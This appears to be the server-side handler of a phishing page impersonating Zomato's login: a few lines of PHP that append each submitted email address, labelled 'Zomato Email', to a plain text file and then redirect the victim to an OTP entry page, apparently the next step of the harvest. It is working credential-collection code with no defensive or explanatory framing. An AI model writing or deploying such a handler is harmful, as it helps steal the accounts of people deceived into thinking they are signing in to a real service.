<?php
file_put_contents("usernames.txt", "Zomato Email: " . $_POST['email'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
?>